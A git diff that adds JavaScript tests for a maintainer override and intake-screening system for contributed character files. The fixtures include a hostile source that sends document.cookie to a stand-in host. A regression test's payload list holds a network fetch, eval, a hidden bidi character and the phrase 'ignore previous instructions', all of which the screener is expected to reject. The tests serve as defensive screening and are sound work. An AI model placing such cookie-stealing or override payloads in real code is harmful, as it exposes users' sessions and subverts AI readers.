@@ -14,6 +14,7 @@ import { BOT, OPERATORS, isOperator } from "../../scripts/character-operators.mj
 import { inspectAccountRename, onlyAccountLoginChanged } from "../../scripts/character-account-rename.mjs";
 import { createGitHub } from "../../scripts/character-github.mjs";
 import { snapshotRename, refreshRenameSnapshot } from "../../scripts/account-rename-snapshot.mjs";
+import { OVERRIDE_VERIFIED, overridePaths } from "../../scripts/character-override.mjs";
 
 const NOW = Date.parse("2026-10-04T12:00:00Z");
 const person = (login, extra = {}) => ({ login, counts: { commits: 1 }, first_seen_at: "2026-09-01T00:00:00Z", last_seen_at: "2026-10-04T11:00:00Z", ...extra });
@@ -848,4 +849,374 @@ test("activity and public labels use the current owner login, never a reused per
   assert.equal(c.applySnapshot(snapshot(person("Bitclank-Bill")), NOW), 1);
   assert.equal(c.roster[0].lastCommitAt, Date.parse(person("Bitclank-Bill").last_seen_at));
   assert.equal(c.roster[0].lastContributionAt, c.roster[0].lastCommitAt);
+});
+
+// A small in-memory GitHub: commits with trees and ancestry, three-dot compares
+// from the merge base, signed bot commits, statuses and comments.
+const overrideFixture = () => {
+  const repo = "example/land", bot = "private-app[bot]", char = (name) => `src/characters/${name}.js`;
+  const custom = (handle, note = "") => `(() => {\n  "use strict";\n  const BL = window.BL;\n  BL.characters.add({\n    handle: "${handle}",\n    joined: 1,\n    lastCommit: 2,\n    dress: { crown(k, v) { v.set(0, 0, 0, k.P.black); } }\n  });\n})();\n${note}`;
+  const blob = (source) => digest(source).slice(0, 40);
+  const commits = new Map();
+  let seq = 1;
+  const commit = (parents, changes, author = bot, verified = true) => {
+    const id = (seq++).toString(16).padStart(40, "0"), tree = new Map(parents.length ? commits.get(parents[0]).tree : []);
+    for (const [path, source] of Object.entries(changes)) source === null ? tree.delete(path) : tree.set(path, source);
+    commits.set(id, { tree, parents, author, verified });
+    return id;
+  };
+  const ancestors = (id) => {
+    const seen = [], queue = [id];
+    while (queue.length) { const next = queue.shift(); if (!seen.includes(next)) { seen.push(next); queue.push(...commits.get(next).parents); } }
+    return seen;
+  };
+  const diff = (a, b) => {
+    const before = commits.get(a).tree, after = commits.get(b).tree;
+    return [...new Set([...before.keys(), ...after.keys()])].sort().filter((path) => before.get(path) !== after.get(path))
+      .map((filename) => ({ filename, status: !before.has(filename) ? "added" : !after.has(filename) ? "removed" : "modified" }));
+  };
+  const compare = (a, b) => {
+    const left = ancestors(a), right = ancestors(b), base = right.find((id) => left.includes(id));
+    const ahead = right.filter((id) => !left.includes(id)).reverse();
+    return { status: a === b ? "identical" : right.includes(a) ? "ahead" : left.includes(b) ? "behind" : "diverged",
+      behind_by: left.filter((id) => !right.includes(id)).length, merge_base_commit: { sha: base },
+      total_commits: ahead.length, commits: ahead.map((sha) => ({ sha })), files: diff(base, b) };
+  };
+  const sources = {
+    bad: 'BL.characters.add({ handle: "bad-actor", ...stolen }); fetch("https://example.invalid/" + document.cookie);',
+    natalieQueued: 'BL.characters.add({ handle: "natalievarty", handle: "someone-else" });',
+    tiffanyQueued: custom("tiffanyvarty", "// original boots\n"), held: custom("held"),
+    natalie: custom("natalievarty", "// corrected jaw\n"), tiffany: custom("tiffanyvarty", "// corrected boots\n")
+  };
+  const f = { repo, bot, char, custom, sources, commits, commit, blob, permission: { maint: "admin" }, statuses: [], comments: new Map(), writes: [], calls: [], updates: [] };
+  f.rock = commit([], { [char("kept")]: characterSource({ handle: "kept", joined: 1, lastCommit: 2 }), [char("bad-actor")]: sources.bad, "README.md": "readme\n" });
+  const r0 = f.r0 = f.rock;
+  const source = (number, login, path, text) => {
+    const head = commit([r0], { [path]: text }, login, false);
+    return { number, state: "closed", merged_at: null, user: { login, type: "User" }, base: { ref: "rock", repo: { full_name: repo } }, head: { sha: head, ref: "patch-1", repo: { full_name: `${login}/land` } } };
+  };
+  const natalie = source(483, "natalievarty", char("natalievarty"), sources.natalieQueued), tiffany = source(484, "tiffanyvarty", char("tiffanyvarty"), sources.tiffanyQueued), held = source(9, "held", char("held"), sources.held);
+  const entry = (pr, text) => ({ pr: pr.number, head: pr.head.sha, author: pr.user.login, path: diff(r0, pr.head.sha)[0].filename, base: null, hash: digest(text), lane: "manual" });
+  f.entries = { natalie: entry(natalie, sources.natalieQueued), tiffany: entry(tiffany, sources.tiffanyQueued), held: entry(held, sources.held) };
+  const bundle = (number, lane, entries, files = {}) => {
+    const head = commit([r0], { ...files, [manifestPath(lane)]: JSON.stringify({ version: 1, lane, openedOn: "2026-11-03", entries }, null, 2) + "\n" });
+    return { number, state: "open", user: { login: bot, type: "Bot" }, base: { ref: "rock", repo: { full_name: repo } }, head: { sha: head, ref: `automation/characters-${lane}-round`, repo: { full_name: repo } } };
+  };
+  const manual = bundle(450, "manual", [f.entries.natalie, f.entries.tiffany, f.entries.held],
+    { [char("natalievarty")]: sources.natalieQueued, [char("tiffanyvarty")]: sources.tiffanyQueued, [char("held")]: sources.held });
+  const head = commit([r0], { [char("bad-actor")]: null, [char("natalievarty")]: sources.natalie, [char("tiffanyvarty")]: sources.tiffany }, "maint", false);
+  const overridePr = (number, sha, start) => ({ number, start, state: "open", draft: false, merged_at: null, user: { login: "maint", id: 5, type: "User" },
+    base: { ref: "rock", repo: { full_name: repo } }, head: { sha, ref: `character-override/pr-${number}`, repo: { full_name: repo } } });
+  f.override = overridePr(600, head, r0);
+  f.prs = [manual, bundle(451, "daily", []), bundle(452, "rename", []), f.override, natalie, tiffany, held];
+  f.manual = manual;
+  const pull = (number) => f.prs.find((pr) => pr.number === number);
+  // Another maintainer override branched from current rock.
+  f.addOverride = (number, changes) => { const pr = overridePr(number, commit([f.rock], changes, "maint", false), f.rock); f.prs.push(pr); return pr; };
+  // A contributor revision, queued in the manual bundle by a signed bot commit.
+  f.enqueue = (number, login, path, text) => {
+    const pr = { number, state: "closed", merged_at: null, user: { login, type: "User" }, base: { ref: "rock", repo: { full_name: repo } },
+      head: { sha: commit([f.rock], { [path]: text }, login, false), ref: "patch-2", repo: { full_name: `${login}/land` } } };
+    f.prs.push(pr);
+    const current = commits.get(f.rock).tree.get(path);
+    const queued = { pr: number, head: pr.head.sha, author: login, path, base: current === undefined ? null : blob(current), hash: digest(text), lane: "manual" };
+    manual.head.sha = commit([manual.head.sha], { [path]: text, [manifestPath("manual")]: JSON.stringify({ version: 1, lane: "manual", openedOn: "2026-11-03", entries: [...f.manifest(), queued] }) });
+    return queued;
+  };
+  f.merge = (pr = f.override) => {
+    const merged = commit([f.rock, pr.head.sha], Object.fromEntries(diff(pr.start, pr.head.sha)
+      .map(({ filename }) => [filename, commits.get(pr.head.sha).tree.get(filename) ?? null])), "maint");
+    Object.assign(pr, { state: "closed", merged_at: "2026-11-07T00:00:00Z", merge_commit_sha: merged });
+    f.rock = merged;
+  };
+  f.gh = { repo,
+    tree: async (ref) => new Map([...commits.get(ref).tree].map(([path, text]) => [path, { sha: blob(text) }])),
+    file: async (ref, path) => { const text = commits.get(ref).tree.get(path); return text === undefined ? null : { source: text, sha: blob(text) }; },
+    commit: async (branch, expected, additions, deletions, message) => {
+      const pr = f.prs.find((row) => row.head.ref === branch);
+      assert.equal(pr.head.sha, expected);
+      pr.head.sha = commit([expected], Object.fromEntries([...additions.map((file) => [file.path, file.source]), ...deletions.map((path) => [path, null])]));
+      f.writes.push({ branch, additions, deletions, message });
+      return pr.head.sha;
+    },
+    list: async (url) => {
+      if (url === "pulls?state=open&base=rock") return f.prs.filter((pr) => pr.state === "open");
+      if (/^issues\/\d+\/comments$/.test(url)) return f.comments.get(Number(url.split("/")[1])) || [];
+      if (/^commits\/[a-f0-9]{40}\/statuses$/.test(url)) return f.statuses.filter((row) => row.sha === url.split("/")[1]).reverse();
+      if (/^pulls\/\d+\/files$/.test(url)) { const pr = pull(Number(url.split("/")[1])); return diff(pr.start, pr.head.sha); }
+      if (url.endsWith("/reviews")) return [];
+      throw new Error(`Unexpected list ${url}`);
+    },
+    api: async (url, method = "GET", data) => {
+      f.calls.push({ url, method });
+      if (url === "git/ref/heads/rock") return { object: { sha: f.rock } };
+      if (/^pulls\/\d+$/.test(url)) { const pr = pull(Number(url.split("/")[1])); if (method === "PATCH") Object.assign(pr, data); return structuredClone(pr); }
+      if (/^pulls\/\d+\/update-branch$/.test(url)) { f.updates.push(url); return {}; }
+      if (url.startsWith("collaborators/")) { const level = f.permission[decodeURIComponent(url.split("/")[1])] || "read"; return { permission: level, role_name: level }; }
+      if (url.startsWith("compare/")) { const [a, b] = url.slice(8).split("..."); return compare(a, b); }
+      if (url.startsWith("commits/")) {
+        const sha = url.slice(8).split("?")[0], row = commits.get(sha);
+        return { author: { login: row.author }, parents: row.parents.map((id) => ({ sha: id })), files: row.parents.length ? diff(row.parents[0], sha) : [], commit: { verification: { verified: row.verified } } };
+      }
+      if (url.startsWith("statuses/")) { f.statuses.push({ sha: url.slice(9), ...data, creator: { login: f.statusCreator || bot } }); return {}; }
+      if (/^issues\/\d+\/comments$/.test(url)) { const n = Number(url.split("/")[1]); f.comments.set(n, [...f.comments.get(n) || [], { user: { login: bot }, body: data.body }]); return {}; }
+      throw new Error(`Unexpected request ${method} ${url}`);
+    }
+  };
+  f.coordinator = createCoordinator(f.gh, bot, () => new Date(NOW));
+  f.gate = (context = "Character intake") => f.statuses.filter((row) => row.sha === f.override.head.sha && row.context === context).at(-1);
+  f.manifest = () => JSON.parse(commits.get(manual.head.sha).tree.get(manifestPath("manual"))).entries;
+  return f;
+};
+
+test("a maintainer override PR is verified and audited without parsing replaced sources or touching the queue before merge", async () => {
+  const f = overrideFixture();
+  // The queued Natalie revision is unreadable as an identity; ordinary readers still refuse it.
+  await assert.rejects(queuedCharacters(f.gh, f.bot), /Character fields|literal/);
+  await f.coordinator.intake({ pr: 600 });
+  assert.equal(f.gate().state, "success");
+  assert.ok(f.gate().description.startsWith(OVERRIDE_VERIFIED));
+  assert.equal(f.gate("Character bundle safety").state, "success");
+  const audit = f.comments.get(600)[0].body;
+  assert.match(audit, new RegExp(`exact head ${f.override.head.sha}`));
+  assert.match(audit, /removed src\/characters\/bad-actor\.js \(was blob [a-f0-9]{40}\)/);
+  assert.match(audit, /added src\/characters\/natalievarty\.js: blob [a-f0-9]{40}, sha256 [a-f0-9]{64}, owner natalievarty/);
+  for (const entry of [f.entries.natalie, f.entries.tiffany]) assert.ok(audit.includes(`#${entry.pr} at ${entry.head} by ${entry.author}`));
+  assert.ok(!audit.includes("held.js"), "unrelated queued work is not superseded");
+  // Nothing was extracted, closed or rewritten; only statuses and the audit comment.
+  assert.equal(f.writes.length, 0);
+  assert.equal(f.override.state, "open");
+  assert.ok(f.calls.filter((call) => call.method !== "GET").every((call) => call.url.startsWith("statuses/") || call.url === "issues/600/comments"));
+  await f.coordinator.intake({ pr: 600 });
+  assert.equal(f.comments.get(600).length, 1, "an unchanged audit is not repeated");
+  // A pinned account's rename check never overwrites an override's statuses.
+  assert.equal(await f.coordinator.accountRename(600), false);
+});
+
+test("maintainer overrides refuse nonmaintainers, forks, bots, drafts, mixed or stale diffs, bad new sources and lost permission", async () => {
+  const denied = async (change, pattern, state = "failure") => {
+    const f = overrideFixture();
+    await change(f);
+    await f.coordinator.intake({ pr: 600 }).catch((error) => { if (state !== "error") throw error; assert.match(error.message, pattern); });
+    if (state !== "error") assert.match(f.gate().description, pattern);
+    assert.equal(f.gate().state, state === "pending" ? "pending" : "failure");
+    assert.equal(f.comments.get(600), undefined, "no audit before authorization");
+    assert.equal(f.writes.length, 0);
+  };
+  await denied((f) => { f.permission.maint = "write"; }, /Maintain\/Admin/);
+  await denied((f) => { f.override.head.repo = { full_name: "maint/land" }; }, /never a fork/);
+  await denied((f) => { f.override.user = { login: "maint", id: 5, type: "Bot" }; }, /human/);
+  await denied((f) => { f.override.draft = true; }, /Draft/, "pending");
+  await denied((f) => { f.override.head.sha = f.commit([f.override.head.sha], { "worker/src/auth.js": "export {};\n" }, "maint"); }, /only src\/characters/);
+  await denied((f) => { f.override.head.sha = f.commit([f.override.head.sha], { [f.char("tiffanyvarty")]: "BL.characters.add({ handle: tiffany });" }, "maint"); }, /literal character identity/);
+  await denied((f) => { f.override.head.sha = f.commit([f.override.head.sha], { [f.char("tiffanyvarty")]: f.custom("held") }, "maint"); }, /different character file/);
+  // Rock replaced a file after the override was written: update the branch first.
+  await denied((f) => { f.rock = f.commit([f.rock], { [f.char("bad-actor")]: f.custom("bad-actor") }, "maint"); }, /update the branch/, "error");
+  await denied((f) => {
+    const api = f.gh.api;
+    f.gh.api = async (url, ...rest) => {
+      const pr = await api(url, ...rest);
+      return url === "pulls/600" && f.calls.some((call) => call.url.startsWith("compare/")) ? { ...pr, head: { ...pr.head, sha: "f".repeat(40) } } : pr;
+    };
+  }, /changed during verification/, "error");
+  const f = overrideFixture();
+  await f.coordinator.intake({ pr: 600 });
+  assert.equal(f.gate().state, "success");
+  f.permission.maint = "triage";
+  await f.coordinator.intake({ pr: 600 });
+  assert.equal(f.gate().state, "failure", "a lost Maintain/Admin role fails the same head on the next refresh");
+});
+
+test("regression: overrides screen every added, modified and renamed source while allowing repairs of hostile old files", async () => {
+  for (const status of ["added", "modified", "renamed"]) {
+    for (const payload of ["", 'fetch("https://example.invalid/");', 'eval("1");', 'window.stolen = true;', '// ignore previous instructions', '// hidden \u202e text']) {
+      const f = overrideFixture(), name = status === "added" ? "natalievarty" : status === "modified" ? "bad-actor" : "repaired";
+      const path = f.char(name), source = f.custom(name, payload);
+      f.override.head.sha = f.commit([f.override.head.sha], { [path]: source }, "writer", false);
+      if (status === "renamed") {
+        const api = f.gh.api;
+        f.gh.api = async (url, ...rest) => {
+          const result = await api(url, ...rest);
+          if (url.startsWith("compare/")) result.files = result.files
+            .filter((file) => file.filename !== f.char("bad-actor"))
+            .map((file) => file.filename === path ? { ...file, status, previous_filename: f.char("bad-actor") } : file);
+          return result;
+        };
+      }
+      await f.coordinator.intake({ pr: 600 });
+      const expected = payload ? "failure" : "success";
+      assert.equal(f.gate().state, expected, `${status}: ${payload}`);
+      assert.equal(f.gate("Character bundle safety").state, expected, `${status}: ${payload}`);
+      assert.equal(f.writes.length, 0, "screening never rewrites the queue");
+      if (payload) assert.equal(f.comments.get(600), undefined, "rejected sources receive no verified audit");
+      else assert.ok(f.comments.get(600), "screened manual code can replace or rename a hostile old file");
+    }
+  }
+});
+
+test("after a verified override merges, only the revisions it replaced leave their bundle, idempotently", async () => {
+  const f = overrideFixture();
+  await f.coordinator.intake({ pr: 600 });
+  f.merge();
+  // Onboarding may run first: the stale unreadable revision reserves nothing; the rest still do.
+  assert.deepEqual((await queuedCharacters(f.gh, f.bot, f.rock)).map((row) => row.path), [f.char("tiffanyvarty"), f.char("held")]);
+  const withdrawn = await f.coordinator.reconcileOverride(600);
+  assert.deepEqual(withdrawn.map((entry) => entry.pr), [483, 484]);
+  assert.equal(f.writes.length, 1);
+  const [write] = f.writes;
+  assert.equal(write.branch, f.manual.head.ref);
+  assert.deepEqual(write.deletions.sort(), [f.char("natalievarty"), f.char("tiffanyvarty")]);
+  assert.deepEqual(write.additions.map((file) => file.path), [manifestPath("manual")]);
+  for (const entry of [f.entries.natalie, f.entries.tiffany]) assert.ok(write.message.includes(`#${entry.pr} at ${entry.head} by ${entry.author}, sha256 ${entry.hash}`));
+  assert.ok(write.message.includes(f.override.merge_commit_sha));
+  assert.deepEqual(f.manifest(), [f.entries.held], "unrelated queued work keeps its place and provenance");
+  assert.equal(f.commits.get(f.manual.head.sha).tree.get(f.char("held")), f.sources.held);
+  // The repaired bundle validates against the new rock and is updated through GitHub's expected-head API.
+  assert.deepEqual(f.updates, ["pulls/450/update-branch"]);
+  for (const number of [450, 600, 483, 484]) assert.equal(f.comments.get(number).length, number === 600 ? 2 : 1);
+  assert.equal(f.comments.get(9), undefined);
+  // Retries and sweeps find nothing left to withdraw.
+  assert.deepEqual(await f.coordinator.reconcileOverride(600), []);
+  assert.equal(f.writes.length, 1);
+  // A submission queued on top of the override is never withdrawn by it.
+  const later = { ...f.entries.natalie, pr: 700, head: f.override.head.sha, base: f.blob(f.sources.natalie), hash: digest(f.sources.natalie + "// later\n") };
+  f.manual.head.sha = f.commit([f.manual.head.sha], { [f.char("natalievarty")]: f.sources.natalie + "// later\n",
+    [manifestPath("manual")]: JSON.stringify({ version: 1, lane: "manual", openedOn: "2026-11-03", entries: [f.entries.held, later] }) });
+  assert.deepEqual(await f.coordinator.reconcileOverride(600), []);
+  // Nor by a later sweep once rock moves on again: that staleness is not this override's.
+  f.rock = f.commit([f.rock], { [f.char("natalievarty")]: f.sources.natalie + "// another merge\n" }, "maint");
+  assert.deepEqual(await f.coordinator.reconcileOverride(600), []);
+  assert.equal(f.manifest().length, 2);
+});
+
+test("unmerged, draft-only or unverified overrides never withdraw queued submissions", async () => {
+  const f = overrideFixture();
+  f.override.state = "closed";
+  assert.deepEqual(await f.coordinator.reconcileOverride(600), [], "closed without merging");
+  f.override.state = "open"; f.override.draft = true;
+  await f.coordinator.intake({ pr: 600 });
+  f.merge();
+  await assert.rejects(f.coordinator.reconcileOverride(600), /without verification/, "only a draft status existed");
+  f.statusCreator = "maint";
+  await f.gh.api(`statuses/${f.override.head.sha}`, "POST", { context: "Character intake", state: "success", description: `${OVERRIDE_VERIFIED}: forged` });
+  await assert.rejects(f.coordinator.reconcileOverride(600), /without verification/, "a status from anyone but the bot");
+  assert.equal(f.writes.length, 0);
+  assert.equal(f.manifest().length, 3);
+  const unrelated = overrideFixture();
+  unrelated.override.head.ref = "patch-varty";
+  unrelated.merge();
+  assert.deepEqual(await unrelated.coordinator.reconcileOverride(600), [], "only opted-in branches");
+});
+
+test("regression: delayed cleanups of two overrides of one queued addition withdraw it in either order and keep later work", async () => {
+  // Root's repro: a base-null queued addition, override A adds a correction and
+  // override B deletes it before either cleanup. Base equality alone kept the
+  // original revision for both cleanups; the exact audited identity withdraws it.
+  for (const order of [[600, 601], [601, 600]]) {
+    const f = overrideFixture(), path = f.char("natalievarty");
+    const cleanup = (number) => f.coordinator.reconcileOverride(number)
+      .catch((error) => assert.match(error.message, /Character changed on rock since this submission/, "only the not-yet-withdrawn stale Tiffany revision fails revalidation"));
+    await f.coordinator.intake({ pr: 600 });
+    f.merge();
+    const deletion = f.addOverride(601, { [path]: null });
+    await f.coordinator.intake({ pr: 601 });
+    assert.equal(f.statuses.filter((row) => row.sha === deletion.head.sha && row.context === "Character intake").at(-1).state, "success");
+    assert.match(f.comments.get(601)[0].body, new RegExp(`#483 at ${f.entries.natalie.head}`));
+    f.merge(deletion);
+    await cleanup(order[0]);
+    assert.ok(!f.manifest().some((entry) => entry.pr === 483), `${order}: the first cleanup withdraws the original revision`);
+    // A valid resubmission queued on rock without the file is later work, not superseded.
+    const later = f.enqueue(700, "natalievarty", path, f.custom("natalievarty", "// resubmitted\n"));
+    assert.equal(later.base, null);
+    await cleanup(order[1]);
+    for (const number of order) assert.deepEqual(await f.coordinator.reconcileOverride(number), [], `${order}: retries withdraw nothing more`);
+    assert.deepEqual(f.manifest().map((entry) => entry.pr), [9, 700]);
+    assert.equal(f.commits.get(f.manual.head.sha).tree.get(path), f.custom("natalievarty", "// resubmitted\n"));
+  }
+});
+
+test("cleanup trusts only the bot's own audit record bound to its verified status", async () => {
+  const f = overrideFixture();
+  await f.coordinator.intake({ pr: 600 });
+  const description = f.gate().description, [audit] = f.comments.get(600), original = audit.body;
+  assert.match(description, /, record [a-f0-9]{64}$/);
+  assert.ok(description.length <= 140);
+  f.merge();
+  audit.body = original.replace(/"entries":\["[a-f0-9]{64}"/, `"entries":["${"0".repeat(64)}"`);
+  await assert.rejects(f.coordinator.reconcileOverride(600), /missing or altered/, "an edited bot comment");
+  f.comments.set(600, [{ user: { login: "maint" }, body: original }]);
+  await assert.rejects(f.coordinator.reconcileOverride(600), /missing or altered/, "a faithful copy by another account");
+  f.comments.set(600, [{ user: { login: f.bot }, body: original }]);
+  f.statusCreator = "maint";
+  await f.gh.api(`statuses/${f.override.head.sha}`, "POST", { context: "Character intake", state: "success", description });
+  await assert.rejects(f.coordinator.reconcileOverride(600), /without verification/, "a copied status from another account");
+  assert.equal(f.writes.length, 0);
+  f.statusCreator = null;
+  await f.gh.api(`statuses/${f.override.head.sha}`, "POST", { context: "Character intake", state: "success", description });
+  assert.deepEqual((await f.coordinator.reconcileOverride(600)).map((entry) => entry.pr), [483, 484]);
+});
+
+test("role loss or a rock update during an override scan fails closed instead of passing", async () => {
+  const f = overrideFixture(), api = f.gh.api;
+  let checks = 0;
+  f.gh.api = async (url, ...rest) => {
+    if (url.startsWith("collaborators/") && ++checks > 1) f.permission.maint = "write";
+    return api(url, ...rest);
+  };
+  await f.coordinator.intake({ pr: 600 });
+  assert.equal(checks, 2, "permission is read again just before publishing success");
+  assert.equal(f.gate().state, "failure");
+  assert.ok(!f.statuses.some((row) => row.state === "success"));
+  const g = overrideFixture(), list = g.gh.list;
+  g.gh.list = async (url) => {
+    if (url === "pulls?state=open&base=rock") g.rock = g.commit([g.rock], { "README.md": "moved\n" }, "maint");
+    return list(url);
+  };
+  await assert.rejects(g.coordinator.intake({ pr: 600 }), /rock changed during verification/);
+  assert.equal(g.gate().state, "failure");
+});
+
+test("override paths are character-only and include both sides of a rename", () => {
+  const { changes, touched } = overridePaths([{ filename: "src/characters/new.js", previous_filename: "src/characters/old.js", status: "renamed" },
+    { filename: "src/characters/gone.js", status: "removed" }]);
+  assert.deepEqual([...touched].sort(), ["src/characters/gone.js", "src/characters/new.js", "src/characters/old.js"]);
+  assert.deepEqual(changes.map((change) => [change.path, change.previous]), [["src/characters/new.js", "src/characters/old.js"], [null, "src/characters/gone.js"]]);
+  for (const files of [[], [{ filename: "src/characters/a.js", status: "copied" }], [{ filename: "src/characters/../a.js", status: "added" }],
+    [{ filename: "src/characters/a.js", previous_filename: "src/js/a.js", status: "renamed" }], [{ filename: ".github/character-bundles/manual.json", status: "modified" }]]) {
+    assert.throws(() => overridePaths(files), CharacterRejection);
+  }
+  assert.throws(() => overridePaths(Array(300).fill({ filename: "src/characters/a.js", status: "added" })), /incomplete/);
+});
+
+test("the identity check lets a verified override delete a malformed character without reading it, and nobody else", async (t) => {
+  const repo = "example/land";
+  const saved = Object.fromEntries(["GITHUB_REPOSITORY", "GITHUB_TOKEN", "CHARACTER_BOT_LOGIN"].map((key) => [key, process.env[key]]));
+  Object.assign(process.env, { GITHUB_REPOSITORY: repo, GITHUB_TOKEN: "test-token", CHARACTER_BOT_LOGIN: "private-app[bot]" });
+  t.after(() => { for (const [key, value] of Object.entries(saved)) { if (value === undefined) delete process.env[key]; else process.env[key] = value; } });
+  const removed = "src/characters/doggyballs.js", added = "src/characters/natalievarty.js";
+  let permission = "admin", addedSource = 'BL.characters.add({ handle: "natalievarty", joined: 1, lastCommit: 2 });';
+  const fetched = [];
+  t.mock.method(globalThis, "fetch", async (url) => {
+    const path = url.slice(`https://api.github.com/repos/${repo}/`.length);
+    fetched.push(path);
+    const file = (source) => ({ type: "file", encoding: "base64", size: source.length, content: Buffer.from(source).toString("base64") });
+    let data;
+    if (path.startsWith("pulls/600/files")) data = [{ filename: removed, status: "removed" }, { filename: added, status: "added" }];
+    else if (path.startsWith("collaborators/")) data = { permission };
+    else if (path === `contents/${removed}?ref=base`) data = file('BL.characters.add({ handle: "doggyballs", ...hostile });');
+    else if (path === `contents/${added}?ref=head`) data = file(addedSource);
+    else throw new Error(`Unexpected request: ${path}`);
+    return new Response(JSON.stringify(data));
+  });
+  const pr = (ref, extra = {}) => ({ number: 600, user: { login: "maint", type: "User" }, head: { sha: "head", ref, repo: { full_name: repo } },
+    base: { sha: "base", ref: "rock", repo: { full_name: repo } }, ...extra });
+  assert.deepEqual(await checkCharacterIdentities(pr("character-override/varty")), []);
+  assert.ok(!fetched.includes(`contents/${removed}?ref=base`), "the replaced source is never read");
+  await assert.rejects(checkCharacterIdentities(pr("patch-varty")), /literal|Character fields/, "ordinary PRs still parse what they delete");
+  await assert.rejects(checkCharacterIdentities(pr("character-override/varty", { head: { sha: "head", ref: "character-override/varty", repo: { full_name: "maint/land" } } })), /character-override/);
+  await assert.rejects(checkCharacterIdentities(pr("character-override/varty", { user: { login: "maint", type: "Bot" } })), /character-override/);
+  permission = "write";
+  await assert.rejects(checkCharacterIdentities(pr("character-override/varty")), /character-override/);
+  permission = "admin"; addedSource = 'BL.characters.add({ handle: "natalievarty", github: "w-s-bitcoin", joined: 1, lastCommit: 2 });';
+  await assert.rejects(checkCharacterIdentities(pr("character-override/varty")), /duplicate character handle or GitHub owner/, "the resulting registry stays coherent");
 });
